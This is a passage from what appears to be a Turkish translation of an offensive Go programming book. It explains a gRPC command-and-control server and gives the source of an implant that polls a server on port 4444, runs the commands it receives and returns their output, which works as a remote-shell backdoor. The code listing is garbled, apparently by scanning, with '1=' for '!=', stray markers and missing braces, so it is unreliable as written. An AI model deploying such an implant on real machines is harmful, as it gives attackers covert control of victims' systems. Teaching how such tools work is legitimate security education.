Bir İmplant veya Admin servisini başlatabilmemiz için, Fetch
Command(ctx context.Context, empty *grpcapi.Empty), SendOutput(ctx context
.Context, result *grpcapi.Command) ve RunCommand(ctx context.Context, cmd
*grpcapi.Command) method’larının doğru şekilde tanımlanmış olması gerekir. İmplant ve admin API’lerimizi birbirinden tamamen ayrı tutmak için bunları ayrı tipler olarak uygulayacağız.

Öncelikle, gerekli method’ları implemente edecek `implantServer` ve `adminServer` adlı `struct`’larımızı oluşturuyoruz 0. Her bir tip aynı alanlara sahip: iş ve komut çıktısı göndermek ve almak için kullanılan iki kanal. Bu, sunucularımızın admin ve implant bileşenleri arasında komutları ve bunların cevaplarını proxy’lemesi için oldukça basit bir yol.

Sonra, `NewImplantServer(work, output chan *grpcapi.Command)` ve `NewAdminServer(work, output chan *grpcapi.Command)` adında birkaç yardımcı fonksiyon tanımlıyoruz; bunlar yeni `implantServer` ve `adminServer` örnekleri oluşturuyor 0. Bu fonksiyonların tek amacı, kanalların doğru şekilde başlatıldığından emin olmak.

Şimdi ilginç kısma geldik: gRPC method’larımızın implementasyonu. Method’ların Protobuf şemasıyla bire bir uyuşmadığını fark ediyor olabilirsiniz. Örneğin, her bir method’da `context.Context` parametresi alıyor ve bir `error` döndürüyoruz. Şemanızı derlemek için daha önce çalıştırdığınız `protoc` komutu, üretilen dosyada her arayüz (interface) method tanımına bunları ekledi. Bu sayede istek bağlamını (request context) yönetebilir ve hata döndürebiliriz. Bu, çoğu ağ iletişimi için oldukça standart bir yaklaşımdır. Derleyici, şema dosyamızda bunu açıkça belirtmek zorunda kalmamızı engelledi.

`implantServer` üzerinde implemente ettiğimiz ilk method, `FetchCommand(ctx context.Context, empty *grpcapi.Empty)`, bir `*grpcapi.Empty` alır ve bir `*grpcapi.Command` döndürür 0. gRPC’nin açıkça `null` değerlerine izin vermediği için bu `Empty` tipini tanımladığımızı hatırlayın. Herhangi bir girdi almamıza gerek yok, çünkü istemci implant, `FetchCommand(ctx context.Context, empty *grpcapi.Empty)` method’unu bir tür yoklama (polling) mekanizması olarak çağıracak ve “Hey, benim için bir işin var mı?” diye soracak. Method’un mantığı biraz daha karmaşık, çünkü implant’a iş gönderebilmemiz için gerçekten gönderecek işimizin olması gerekiyor. Bu yüzden, `work` kanalında iş olup olmadığını belirlemek için bir `select` ifadesi 0 kullanıyoruz. Bu şekilde bir kanaldan okuma, engellemesizdir (nonblocking); yani kanaldan okunacak bir şey yoksa, çalışmanın akışı `default` durumumuzu işletecektir. Bu, implant’ın `FetchCommand(ctx context.Context, empty *grpcapi.Empty)` method’unu periyodik olarak çağıracağı ve neredeyse gerçek zamanlı bir takvimle iş alacağı göz önüne alındığında idealdir. Kanalda iş olduğu durumda komutu döndürürüz. Arka planda, komut serileştirilir ve ağ üzerinden implant’a geri gönderilir.

İkinci `implantServer` method’u olan `SendOutput(ctx context.Context, result *grpcapi.Command)`, aldığı `*grpcapi.Command`’i `output` kanalına iter 0. `Command` tipimizi sadece çalıştırılacak komutun tutulduğu bir `string` alanı değil, aynı zamanda komut çıktısını tutacak bir alan içerecek şekilde tanımladığımızı hatırlayın. Aldığımız `Command`’da, implant tarafından çalıştırılan bir komutun sonucu, `output` alanında doldurulmuştur; dolayısıyla `SendOutput(ctx context.Context, result *grpcapi.Command)` method’u, bu sonucu implant’tan alır ve admin bileşenimiz tarafından daha sonra okunacak bir kanala yerleştirir.

Son `implantServer` method’u olan `RunCommand(ctx context.Context, cmd *grpcapi.Command)`, `adminServer` tipi üzerinde tanımlanmıştır. Bu method bir `Command` alır.

```go
func main() {
    var

         opts pgrpc.DialOption
         conn *grpc.ClientConn
         err     error
         client grpcapi.ImplantClient 0

      opts = append(opts, grpc.WithInsecure())
      if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err 1= nil f 0
           log.Fatal(err)

      defer conn.Close()
      client = grpcapi.NewImplantClient(conn)

      ctx := context.Background()
      for { 0
           var req = new(grpcapi.Empty)
           cmd, err := client.FetchCommand(ctx, req) 0
           if err 1= nil {
               log.Fatal(err)

          if cmd.In ==    {
              // No work
              time.Sleep(rtime.Second)
              continue

          tokens := strings.Split(cmd.In, " ")
          var c *exec.Cmd
          if len(tokens) 1==  {
               c = exec.Command(tokens[0])
          ) else {
               c = exec.Command(tokens[0], tokens[1:]...)

          buf, err := c.CombinedOutput00
          if err 1= nil {
               cmd.Out = err.Error()

          cmd.Out += string(buf)
          client.SendOutput(ctx, cmd)
```

**Liste 14-4: İmplant oluşturma (`ch-14/implant/implant.go`)**

İmplant kodu yalnızca bir `main()` fonksiyonu içerir. `grpcapi.ImplantClient` tipinde bir değişken de dahil olmak üzere değişkenlerimizi tanımlayarak başlıyoruz 0. `protoc` komutu bu tipi otomatik olarak bizim için oluşturdu. Bu tip, uzak iletişimi kolaylaştırmak için gerekli tüm RPC fonksiyon iskeletlerine (stub) sahiptir.

Ardından, `grpc.Dial(target string, opts... DialOption)` aracılığıyla, 4444 portunda çalışan implant sunucusuna bir bağlantı kurarız 0. Bu bağlantıyı kullanacağız…
